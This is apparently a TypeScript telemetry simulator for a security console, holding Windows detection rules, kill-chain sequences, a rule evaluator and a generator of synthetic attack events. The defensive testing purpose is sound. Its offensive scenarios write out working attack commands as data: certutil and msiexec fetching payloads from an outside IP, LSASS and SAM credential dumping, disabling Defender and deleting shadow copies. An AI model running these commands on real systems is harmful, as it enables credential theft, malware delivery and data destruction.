// Telemetry simulator for the security-framework console.
// Ports the devsensor scenarios (cmd/devsensor) and the detection rules
// (rules/windows/*.yaml) to TypeScript so the web console can run the
// full pipeline without a live Go engine. The event schema mirrors
// pkg/model exactly: one NDJSON line, one row in the console.

export type SfEvent = {
  id: string
  timestamp: string
  type: string
  source: string
  host: string
  user?: string
  process?: {
    pid: number
    ppid?: number
    name: string
    command_line?: string
    image?: string
  }
  file?: {
    path: string
    extension?: string
    size_bytes?: number
  }
  network?: {
    protocol?: string
    source_ip?: string
    source_port?: number
    destination_ip?: string
    destination_port?: number
    domain?: string
  }
  // Target of process.access (Sysmon event ID 10): the process whose
  // handle was opened. Mirrors model.Target (*Process subset).
  target?: {
    pid: number
    name?: string
    image?: string
  }
  // Handle rights of process.access (granted_access is a hex mask).
  access?: {
    granted_access?: string
    call_trace?: string
  }
  // Registry telemetry (Sysmon event IDs 12/13/14). Mirrors model.Registry.
  registry?: {
    key?: string
    value_name?: string
    value?: string
    operation?: string
  }
  tags?: string[]
  enrichment?: Record<string, string>
}

export type SfAlert = {
  id: string
  timestamp: string
  rule_id: string
  rule_name: string
  severity: 'high' | 'critical' | 'medium' | 'low'
  host: string
  user?: string
  event_id: string
  event_type: string
  summary: string
  matched_on: string[]
  tags: string[]
}

export type RuleMeta = {
  id: string
  name: string
  description: string
  severity: SfAlert['severity']
  event_type: string
  mitre: string
  tactic: string
  tags: string[]
  conditions: { field: string; operator: string; value: string | string[] }[]
}

// ---------------------------------------------------------------------------
// Rules (1:1 port of rules/windows/*.yaml)

export const RULES: RuleMeta[] = [
  {
    id: '9f31c2a4-5d7b-4e18-8a02-3b9c6d1e7f40',
    name: 'PowerShell con comando codificado',
    description:
      'Detecta la ejecución de PowerShell con parámetros de ofuscación típicos: -enc/-encodedcommand, -w hidden y -nop. Técnica clásica de ejecución que evita dejar la intención visible en la línea de comandos.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1059.001',
    tactic: 'Command and Scripting Interpreter: PowerShell',
    tags: ['attack.t1059.001', 'attack.execution'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'powershell.exe' },
      { field: 'process.command_line', operator: 'contains', value: '-enc' },
    ],
  },
  {
    id: 'c1d24e9b-7a03-4c56-9f11-8e2b5a4d9c73',
    name: 'Descarga con certutil o bitsadmin',
    description:
      'Detecta transferencia de ficheros con binarios LOLBas: certutil con -urlcache o bitsadmin con /transfer hacia destinos externos, técnica habitual para descargar payloads evadiendo políticas de aplicación.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1105',
    tactic: 'Command and Control: Ingress Tool Transfer',
    tags: ['attack.t1105', 'attack.command-and-control'],
    conditions: [
      { field: 'process.name', operator: 'in', value: ['certutil.exe', 'bitsadmin.exe'] },
      { field: 'process.command_line', operator: 'contains_any', value: ['-urlcache', '/transfer'] },
    ],
  },
  {
    id: '5b7e1f38-2c94-4d0a-b6e7-19a8c3d54f02',
    name: 'Volcado de LSASS via comsvcs.dll',
    description:
      'Detecta el volcado de memoria de LSASS cargando comsvcs.dll con MiniDump desde rundll32.exe, técnica de acceso a credenciales que evita binarios ofensivos dedicados en disco.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1003.001',
    tactic: 'OS Credential Dumping: LSASS Memory',
    tags: ['attack.t1003.001', 'attack.credential-access'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'rundll32.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'comsvcs.dll' },
      { field: 'process.command_line', operator: 'contains', value: 'MiniDump' },
    ],
  },
  {
    id: 'e8a1c72d-4b6f-4f39-9a52-0d3b7c5f1a11',
    name: 'Creacion de tarea programada',
    description:
      'Detecta la creación de tareas programadas con schtasks.exe, un mecanismo clásico de persistencia y ejecución remota que sobrevive a reinicios y se disimula bien entre tareas legítimas del sistema.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1053.005',
    tactic: 'Scheduled Task/Job: Scheduled Task',
    tags: ['attack.t1053.005', 'attack.persistence'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'schtasks.exe' },
      { field: 'process.command_line', operator: 'contains', value: '/create' },
    ],
  },
  {
    id: 'f3b2d98e-7c15-4a58-8e0a-2c4d6e8f0b22',
    name: 'Ejecucion de procesos via WMI',
    description:
      'Detecta la creación de procesos mediante WMI (wmic process call create), técnica de ejecución y movimiento lateral que apenas deja rastro en disco y abusa de herramientas administrativas nativas.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1047',
    tactic: 'Windows Management Instrumentation',
    tags: ['attack.t1047', 'attack.execution'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'wmic.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'process call create' },
    ],
  },
  {
    id: 'a7c4e5f1-9d28-4b36-8f47-1e5a9c3d6b33',
    name: 'Manipulacion de Windows Defender',
    description:
      'Detecta intentos de debilitar Windows Defender desde PowerShell: desactivar la protección en tiempo real, el monitoreo de comportamiento o añadir exclusiones para esconder payloads.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1562.001',
    tactic: 'Impair Defenses: Disable or Modify Tools',
    tags: ['attack.t1562.001', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'powershell.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'Set-MpPreference' },
      { field: 'process.command_line', operator: 'contains_any', value: ['-DisableRealtimeMonitoring', '-DisableBehaviorMonitoring', '-ExclusionPath'] },
    ],
  },
  {
    id: 'b8d5f6e2-0e39-4c47-9a58-2f6b0d4e7c44',
    name: 'Borrado de instantaneas VSS',
    description:
      'Detecta el borrado de instantáneas de sombra con vssadmin, paso típico de ransomware para impedir la recuperación del sistema antes del cifrado masivo de ficheros.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1490',
    tactic: 'Inhibit System Recovery',
    tags: ['attack.t1490', 'attack.impact'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'vssadmin.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'delete shadows' },
    ],
  },
  {
    id: '3e6a9c15-8d47-4b2e-9f01-5a8c3d7e2b55',
    name: 'Volcado del registro SAM',
    description:
      'Detecta el volcado de la colmena del registro SAM con reg.exe save, técnica de acceso a credenciales que extrae los hashes de las cuentas locales sin tocar LSASS ni usar herramientas ofensivas.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1003.002',
    tactic: 'OS Credential Dumping: Security Account Manager',
    tags: ['attack.t1003.002', 'attack.credential-access'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'reg.exe' },
      { field: 'process.command_line', operator: 'contains', value: ' save ' },
      { field: 'process.command_line', operator: 'contains_any', value: ['HKLM\\SAM', 'HKLM\\SYSTEM'] },
    ],
  },
  {
    id: '4f7b0d26-9e58-4c3f-a112-6b9d4e8f3c66',
    name: 'Volcado de LSASS con procdump',
    description:
      'Detecta el volcado de memoria de LSASS con procdump, variante que abusa de un binario firmado de Sysinternals para evadir políticas de aplicación mientras captura las credenciales en claro del equipo.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1003.001',
    tactic: 'OS Credential Dumping: LSASS Memory',
    tags: ['attack.t1003.001', 'attack.credential-access'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'procdump.exe' },
      { field: 'process.command_line', operator: 'contains', value: '-ma' },
      { field: 'process.command_line', operator: 'contains', value: 'lsass' },
    ],
  },
  {
    id: '5a8c1e37-af69-4d40-b223-7cae5f9a4d77',
    name: 'Ejecucion de scripts con regsvr32',
    description:
      'Detecta la ejecución de scriptlets remotos o locales mediante regsvr32 con scrobj.dll, técnica LOLBas que ejecuta código firmado por el binario de Windows y evita controles de aplicación clásicos.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1218.010',
    tactic: 'System Binary Proxy Execution: Regsvr32',
    tags: ['attack.t1218.010', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'regsvr32.exe' },
      { field: 'process.command_line', operator: 'contains_any', value: ['/i:http', 'scrobj.dll'] },
    ],
  },
  {
    id: '6b9d2f48-b07a-4e51-8334-8dbf60ab5e88',
    name: 'Instalacion remota con msiexec',
    description:
      'Detecta la instalación de paquetes MSI directamente desde URLs remotas con msiexec, vía de ejecución que salta el disco y las pasarelas de correo al no existir un fichero adjunto que analizar.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1218.005',
    tactic: 'System Binary Proxy Execution: Msiexec',
    tags: ['attack.t1218.005', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'msiexec.exe' },
      { field: 'process.command_line', operator: 'contains', value: '/i' },
      { field: 'process.command_line', operator: 'contains', value: 'http' },
    ],
  },
  {
    id: '7cae3059-c18b-4f62-9445-9ec071bc6f99',
    name: 'Desactivacion del firewall de Windows',
    description:
      'Detecta la desactivación de perfiles del firewall de Windows con netsh advfirewall, paso habitual para abrir el tráfico de red antes del movimiento lateral o para mantener canales de mando encubiertos.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1562.004',
    tactic: 'Impair Defenses: Disable or Modify System Firewall',
    tags: ['attack.t1562.004', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'netsh.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'advfirewall' },
      { field: 'process.command_line', operator: 'contains', value: 'state off' },
    ],
  },
  {
    id: '8dbf416a-d29c-4073-a556-afd182cd70aa',
    name: 'Borrado de registros de eventos',
    description:
      'Detecta el borrado de canales de registro de eventos con wevtutil (cl o clear-log), técnica de encubrimiento que destruye las trazas forenses justo antes o después de la acción destructiva.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1070.001',
    tactic: 'Indicator Removal: Clear Windows Event Logs',
    tags: ['attack.t1070.001', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'wevtutil.exe' },
      { field: 'process.command_line', operator: 'contains_any', value: [' cl ', 'clear-log'] },
    ],
  },
  {
    id: '9ec0527b-e3ad-4184-b667-be92593de81b',
    name: 'Persistencia en clave Run',
    description:
      'Detecta la escritura de valores en claves Run del registro, el mecanismo de persistencia más clásico: cualquier binario allí se relanza en cada inicio de sesión sin requerir privilegios.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1547.001',
    tactic: 'Boot or Logon Autostart Execution: Registry Run Keys',
    tags: ['attack.t1547.001', 'attack.persistence'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'reg.exe' },
      { field: 'process.command_line', operator: 'contains', value: ' add ' },
      { field: 'process.command_line', operator: 'contains_any', value: ['CurrentVersion\\Run', 'CurrentVersion\\RunOnce'] },
    ],
  },
  {
    id: 'afd1638c-f4be-4295-c778-cfa36a4ef92c',
    name: 'Movimiento lateral con PsExec',
    description:
      'Detecta la ejecución remota de procesos con PsExec contra otros equipos, técnica estándar de movimiento lateral que abusa de recursos administrativos y deja servicios temporales en el destino.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1021.002',
    tactic: 'Remote Services: SMB/Windows Admin Shares',
    tags: ['attack.t1021.002', 'attack.lateral-movement'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'psexec.exe' },
      { field: 'process.command_line', operator: 'contains', value: '\\\\' },
    ],
  },
  // -----------------------------------------------------------------
  // Real-telemetry rules (1:1 port of rules/windows/realtime-host.yaml):
  // they fire on ARTIFACTS (registry writes, dropped files, loaded
  // modules, handle access, DNS) captured by real sensors, not on
  // offensive command lines.
  {
    id: '7d1e2f40-5a6b-4c7d-9e8f-0a1b2c3d4e5f',
    name: 'Persistencia en clave Run via registro',
    description:
      'Detecta la escritura de una clave de autostart Run o RunOnce en el registro directamente, sea cual sea el proceso que la escriba. Malware real persiste llamando a la API de registro, sin lanzar reg.exe: esta regla cubre esa variante que la deteccion por linea de comandos no ve.',
    severity: 'high',
    event_type: 'registry.set',
    mitre: 'T1547.001',
    tactic: 'Persistence',
    tags: ['attack.t1547.001', 'attack.persistence', 'sensor:registry'],
    conditions: [
      { field: 'registry.operation', operator: 'eq', value: 'SetValue' },
      { field: 'registry.key', operator: 'regex', value: '(?i)\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\(Run|RunOnce)$' },
    ],
  },
  {
    id: '8e2f3a51-6b7c-4d8e-af90-1b2c3d4e5f60',
    name: 'Defensa antivirus desactivada via registro',
    description:
      'Detecta la desactivacion de la proteccion en tiempo real de Windows Defender escribiendo los conmutadores de politica del registro (DisableAntiSpyware, DisableRealtimeMonitoring y similares), cualquiera que sea el proceso que los escriba.',
    severity: 'high',
    event_type: 'registry.set',
    mitre: 'T1562.001',
    tactic: 'Defense Evasion',
    tags: ['attack.t1562.001', 'attack.defense-evasion', 'sensor:registry'],
    conditions: [
      { field: 'registry.operation', operator: 'eq', value: 'SetValue' },
      { field: 'registry.value_name', operator: 'regex', value: '(?i)^(disableantispyware|disableantivirus|disablerealtimemonitoring|disablebehaviormonitoring|disableioavprotection|disablescheduledscans)$' },
    ],
  },
  {
    id: '9f3a4b62-7c8d-4e9f-b0a1-2c3d4e5f6a70',
    name: 'Exclusiones de Defender anadidas via registro',
    description:
      'Detecta la creacion de exclusiones en Windows Defender via registro (carpetas, procesos o extensiones que el antivirus dejara de escanear). Tecnica silenciosa que sobrevive reinicios y antecede normalmente a la ejecucion del payload real.',
    severity: 'high',
    event_type: 'registry.set',
    mitre: 'T1562.001',
    tactic: 'Defense Evasion',
    tags: ['attack.t1562.001', 'attack.defense-evasion', 'sensor:registry'],
    conditions: [
      { field: 'registry.operation', operator: 'in', value: ['SetValue', 'CreateKey'] },
      { field: 'registry.key', operator: 'regex', value: '(?i)\\\\Microsoft\\\\Windows Defender\\\\Exclusions' },
    ],
  },
  {
    id: 'a04b5c73-8d9e-4fa0-c1b2-3d4e5f6a7b80',
    name: 'Ejecutable soltado en carpeta de inicio',
    description:
      'Detecta la creacion de un archivo ejecutable o script en la carpeta de Inicio del menu, mecanismo de persistencia basado en ficheros que se ejecuta con la sesion de cualquier usuario. Se detecta el artefacto (escritura del fichero), no el comando que lo solto.',
    severity: 'high',
    event_type: 'file.write',
    mitre: 'T1547.005',
    tactic: 'Persistence',
    tags: ['attack.t1547.005', 'attack.persistence', 'sensor:file'],
    conditions: [
      { field: 'file.path', operator: 'regex', value: '(?i)\\\\Start Menu\\\\Programs\\\\Startup\\\\' },
      { field: 'file.extension', operator: 'regex', value: '(?i)^(exe|dll|bat|cmd|ps1|vbs|vbe|js|jse|wsf|wsh|scr|hta|lnk)$' },
    ],
  },
  {
    id: 'b15c6d84-9eaf-40b1-d2c3-4e5f6a7b8c90',
    name: 'Ejecutable disfrazado de documento',
    description:
      'Detecta la creacion de ficheros con doble extension de tipo documento mas .exe (payload.pdf.exe, factura.docx.exe...), tecnica de suplantacion que explota que Windows oculta las extensiones conocidas por defecto. Alta confianza: casi ningun software legimo genera esos nombres.',
    severity: 'high',
    event_type: 'file.write',
    mitre: 'T1036.007',
    tactic: 'Defense Evasion',
    tags: ['attack.t1036.007', 'attack.defense-evasion', 'sensor:file'],
    conditions: [
      { field: 'file.path', operator: 'regex', value: '(?i)\\.(pdf|doc|docx|xls|xlsx|ppt|pptx|jpg|jpeg|png|txt|zip)\\.(exe|scr|com|pif|bat)$' },
    ],
  },
  {
    id: 'd37e8fa6-b0cf-42d3-f4e5-6a7b8c9dae10',
    name: 'Acceso a memoria de LSASS',
    description:
      'Detecta un proceso abriendo un handle de acceso a la memoria de LSASS con derechos de lectura totales: el paso obligatorio de todo volcado de credenciales (Mimikatz, comsvcs.dll MiniDump, procdump, pypykatz...). Deteccion de EDR real: dispara antes de que las credenciales salgan de la maquina y es independiente de la herramienta concreta que se use.',
    severity: 'critical',
    event_type: 'process.access',
    mitre: 'T1003.001',
    tactic: 'Credential Access',
    tags: ['attack.t1003.001', 'attack.credential-access', 'sensor:process-access'],
    conditions: [
      { field: 'target.name', operator: 'eq', value: 'lsass.exe' },
      { field: 'access.granted_access', operator: 'regex', value: '(?i)^0x(1010|1033|1410|147a|1fffff)$' },
    ],
  },
  {
    id: 'e48f9ab7-c1d0-43e4-a5f6-7b8c9daebf21',
    name: 'Consulta DNS a dominio generado (posible DGA)',
    description:
      'Detecta consultas DNS a dominios cuyo primer nivel es excepcionalmente largo y alfanumerico, patron tipico de algoritmos de generacion de dominios (DGA) usados por malware para C2 y exfiltracion. Heuristica de confianza media: revisar el resto de alertas del host antes de responder.',
    severity: 'medium',
    event_type: 'network.connect',
    mitre: 'T1568.002',
    tactic: 'Command And Control',
    tags: ['attack.t1568.002', 'attack.command-and-control', 'sensor:dns'],
    conditions: [
      { field: 'network.protocol', operator: 'eq', value: 'dns' },
      { field: 'network.domain', operator: 'regex', value: '(?i)^[a-z0-9]{28,}\\.' },
    ],
  },
  {
    id: 'c26d7e95-afbe-41c2-e3d4-5f6a7b8c9da0',
    name: 'DLL cargada desde ruta de usuario',
    description:
      'Detecta la carga de una DLL desde AppData, Temp o Public, patron tipico de secuestro del orden de busqueda de librerias y de loaders descomprimidos en memoria. Severidad media por falsos positivos posibles (instaladores, apps portables): priorizar si coincide con otras alertas del mismo host.',
    severity: 'medium',
    event_type: 'image.load',
    mitre: 'T1574.001',
    tactic: 'Privilege Escalation',
    tags: ['attack.t1574.001', 'attack.t1574.002', 'attack.privilege-escalation', 'sensor:image'],
    conditions: [
      { field: 'file.path', operator: 'regex', value: '(?i)\\.dll$' },
      { field: 'file.path', operator: 'contains_any', value: ['\\AppData\\', '\\Windows\\Temp\\', '\\Users\\Public\\'] },
    ],
  },
]

// ---------------------------------------------------------------------------
// Kill-chain sequences (1:1 port of sequences/kill-chains.yaml)

export type SimSequence = {
  id: string
  name: string
  severity: SfAlert['severity']
  windowMs: number
  tags: string[]
  steps: string[]
}

export const SEQUENCES: SimSequence[] = [
  {
    id: 'c0a5e7d1-1a2b-4c3d-8e4f-a5b6c7d8e9f0',
    name: 'Campana de robo de credenciales',
    severity: 'critical',
    windowMs: 300_000,
    tags: ['attack.t1003', 'attack.credential-access', 'correlacion'],
    steps: ['Volcado de LSASS via comsvcs.dll', 'Volcado de LSASS con procdump', 'Volcado del registro SAM'],
  },
  {
    id: 'd1b6f8e2-2b3c-4d4e-9f50-b6c7d8e9f0a1',
    name: 'Campana de intrusion completa',
    severity: 'critical',
    windowMs: 300_000,
    tags: ['attack.t1105', 'attack.t1053.005', 'attack.t1490', 'correlacion'],
    steps: ['Descarga con certutil o bitsadmin', 'Creacion de tarea programada', 'Borrado de instantaneas VSS'],
  },
  {
    id: 'e2c7a9f3-3c4d-4e5f-a061-c7d8e9f0a1b2',
    name: 'Apagon defensivo',
    severity: 'critical',
    windowMs: 300_000,
    tags: ['attack.t1562', 'attack.t1070.001', 'attack.defense-evasion', 'correlacion'],
    steps: ['Manipulacion de Windows Defender', 'Desactivacion del firewall de Windows', 'Borrado de registros de eventos'],
  },
  {
    id: 'f3d8ba64-4d5e-4f60-b172-d8e9f0a1b2c3',
    name: 'Instalacion de persistencia',
    severity: 'critical',
    windowMs: 300_000,
    tags: ['attack.t1105', 'attack.t1547.001', 'attack.persistence', 'correlacion'],
    steps: ['Descarga con certutil o bitsadmin', 'Persistencia en clave Run via registro'],
  },
]

function field(ev: SfEvent, path: string): string | undefined {
  if (path === 'process.name') return ev.process?.name
  if (path === 'process.command_line') return ev.process?.command_line
  if (path === 'process.image') return ev.process?.image
  if (path === 'file.path') return ev.file?.path
  if (path === 'file.extension') return ev.file?.extension
  if (path === 'network.domain') return ev.network?.domain
  if (path === 'network.protocol') return ev.network?.protocol
  if (path === 'registry.key') return ev.registry?.key
  if (path === 'registry.value_name') return ev.registry?.value_name
  if (path === 'registry.value') return ev.registry?.value
  if (path === 'registry.operation') return ev.registry?.operation
  if (path === 'target.name') return ev.target?.name
  if (path === 'access.granted_access') return ev.access?.granted_access
  return undefined
}

// The YAML pack writes regexes in Go RE2 syntax, including the (?i)
// inline flag, which JavaScript RegExp does not accept: strip it into
// the RegExp flags and cache compiled patterns per rule condition.
const REGEX_CACHE = new Map<string, RegExp | null>()

function compileRegex(pattern: string): RegExp | null {
  const cached = REGEX_CACHE.get(pattern)
  if (cached !== undefined) return cached
  let src = pattern
  let flags = ''
  if (src.startsWith('(?i)')) {
    flags = 'i'
    src = src.slice(4)
  }
  let re: RegExp | null = null
  try {
    re = new RegExp(src, flags)
  } catch {
    re = null // invalid pattern: the rule condition simply never fires
  }
  REGEX_CACHE.set(pattern, re)
  return re
}

function matchesCondition(ev: SfEvent, c: RuleMeta['conditions'][number]): boolean {
  const v = field(ev, c.field)
  if (v === undefined) return false
  if (c.operator === 'eq') return v === c.value
  if (c.operator === 'neq') return v !== c.value
  if (c.operator === 'contains') return v.includes(c.value as string)
  if (c.operator === 'contains_any')
    return (c.value as string[]).some((s) => v.includes(s))
  if (c.operator === 'startswith') return v.startsWith(c.value as string)
  if (c.operator === 'endswith') return v.endsWith(c.value as string)
  if (c.operator === 'in') return (c.value as string[]).includes(v)
  if (c.operator === 'not_in') return !(c.value as string[]).includes(v)
  if (c.operator === 'regex') {
    const re = compileRegex(c.value as string)
    return re !== null && re.test(v)
  }
  if (c.operator === 'gt' || c.operator === 'lt') {
    // Same semantics as the engine (internal/rules): numeric compare
    // when both sides parse as numbers, lexicographic otherwise.
    const num = (s: unknown): number | null => {
      const n = typeof s === 'number' ? s : parseFloat(String(s))
      return Number.isFinite(n) ? n : null
    }
    const a = num(v)
    const b = num(c.value)
    if (a !== null && b !== null) return c.operator === 'gt' ? a > b : a < b
    return c.operator === 'gt' ? v > (c.value as string) : v < (c.value as string)
  }
  return false
}

/** Returns the list of matched field paths, or null when the rule does not fire. */
export function evaluate(rule: RuleMeta, ev: SfEvent): string[] | null {
  if (ev.type !== rule.event_type) return null
  const matched: string[] = []
  for (const c of rule.conditions) {
    if (!matchesCondition(ev, c)) return null
    if (!matched.includes(c.field)) matched.push(c.field)
  }
  return matched
}

// ---------------------------------------------------------------------------
// Scenario generator (devsensor parity, plus extra benign noise)

const HOSTS = ['LAB-WKS-01', 'LAB-WKS-02', 'LAB-SRV-DC01']
const USERS = ['CORP\\jdoe', 'CORP\\mrodriguez', 'CORP\\aalvarez', 'CORP\\svc_backup']

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randPid(): number {
  return 2000 + Math.floor(Math.random() * 6000)
}

function nowIso(): string {
  return new Date().toISOString()
}

type Scenario = {
  weight: number
  offensive: boolean
  make: () => SfEvent
}

const SCENARIOS: Scenario[] = [
  {
    weight: 9,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'explorer.exe',
        image: 'C:\\Windows\\explorer.exe',
      },
    }),
  },
  {
    weight: 8,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'notepad.exe',
        command_line: '"C:\\Windows\\system32\\NOTEPAD.EXE" C:\\Users\\jdoe\\Documents\\notas-reunion.txt',
        image: 'C:\\Windows\\System32\\notepad.exe',
      },
    }),
  },
  {
    weight: 8,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'network.connect',
      source: 'etw-microsoft-windows-kernel-network',
      host: pick(HOSTS),
      user: pick(USERS),
      network: {
        protocol: 'tcp',
        source_ip: '10.0.4.42',
        source_port: 50000 + Math.floor(Math.random() * 8000),
        destination_ip: '142.250.200.36',
        destination_port: 443,
        domain: 'www.google.com',
      },
    }),
  },
  {
    weight: 7,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'chrome.exe',
        command_line: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
        image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      },
    }),
  },
  {
    weight: 6,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'file.write',
      source: 'etw-microsoft-windows-fileio',
      host: pick(HOSTS),
      user: pick(USERS),
      file: {
        path: 'C:\\Users\\jdoe\\Documents\\informe-trimestral.docx',
        extension: '.docx',
        size_bytes: 48120 + Math.floor(Math.random() * 90000),
      },
    }),
  },
  {
    weight: 5,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.terminate',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: { pid: randPid(), name: 'notepad.exe' },
    }),
  },
  {
    weight: 5,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'powershell.exe',
        command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
    }),
  },
  {
    weight: 4,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'certutil.exe',
        command_line: 'certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe',
        image: 'C:\\Windows\\System32\\certutil.exe',
      },
    }),
  },
  {
    weight: 3,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'rundll32.exe',
        command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\Windows\\Temp\\lsass.dmp full',
        image: 'C:\\Windows\\System32\\rundll32.exe',
      },
    }),
  },
  {
    weight: 3,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'schtasks.exe',
        command_line: 'schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\\Users\\Public\\payload.exe"',
        image: 'C:\\Windows\\System32\\schtasks.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'wmic.exe',
        command_line: 'wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\\Users\\Public\\payload.exe"',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'powershell.exe',
        command_line: 'powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'vssadmin.exe',
        command_line: 'vssadmin.exe delete shadows /all /quiet',
        image: 'C:\\Windows\\System32\\vssadmin.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'msiexec.exe',
        command_line: 'msiexec.exe /q /i http://185.220.101.47/payload.msi',
        image: 'C:\\Windows\\System32\\msiexec.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'procdump.exe',
        command_line: 'procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass2.dmp',
        image: 'C:\\Windows\\System32\\procdump.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'reg.exe',
        command_line: 'reg.exe save HKLM\\SAM C:\\Users\\Public\\sam.hiv',
